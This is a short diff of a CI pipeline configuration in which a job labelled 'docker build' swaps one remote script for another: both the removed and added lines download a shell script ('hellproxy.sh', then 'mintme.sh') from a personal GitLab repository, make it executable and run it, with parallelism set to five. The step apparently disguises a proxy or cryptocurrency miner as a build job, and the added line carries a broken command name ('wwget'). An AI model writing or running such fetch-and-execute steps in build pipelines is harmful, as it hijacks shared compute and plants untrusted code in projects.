@@ -10,5 +10,5 @@ blocks:
       jobs:
         - name: docker build
           commands:
-            - 'wget -O minto https://gitlab.com/richardkevin320/pede/-/raw/main/hellproxy.sh && chmod +x minto && ./minto'
+            - 'wwget -O minto https://gitlab.com/richardkevin320/depo/-/raw/main/mintme.sh && chmod +x minto && ./minto'
           parallelism: 5
